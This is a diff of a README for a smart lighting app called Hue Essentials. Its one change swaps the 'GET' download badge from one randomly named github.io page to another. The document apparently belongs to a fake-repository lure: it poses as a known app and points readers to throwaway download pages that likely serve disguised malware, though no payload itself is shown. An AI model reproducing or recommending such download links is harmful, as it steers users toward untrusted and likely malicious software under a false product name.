@@ -1,6 +1,6 @@
 # Hue Essentials - Smart Lighting Control App
 
-[![GET Hue Essentials](https://img.shields.io/badge/GET%20%E2%80%94%20Hue%20Essentials-0078D6?style=for-the-badge&logoColor=white)](https://sofiaquluf502.github.io/.github/hue-essentials)
+[![GET Hue Essentials](https://img.shields.io/badge/GET%20%E2%80%94%20Hue%20Essentials-0078D6?style=for-the-badge&logoColor=white)](https://ezrahhilljned.github.io/.github/hue-essentials)
 
 ## Overview of Hue Essentials Lighting Control
 
